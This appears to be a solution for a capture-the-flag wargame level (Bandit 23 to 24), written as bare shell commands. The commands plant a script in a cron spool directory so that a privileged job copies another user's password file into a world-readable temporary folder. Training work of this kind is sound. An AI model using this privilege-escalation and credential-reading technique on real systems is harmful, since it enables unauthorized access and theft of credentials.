cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/rii
cd /tmp/rii
nano pass.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/rii/pass_file

chmod +rwx pass.sh
chmod 777 pass.sh
chmod 777 /tmp/rii
touch pass_file
chmod 777 pass_file
cp pass.sh /var/spool/bandit24/foo/pass.sh
cat pass_file

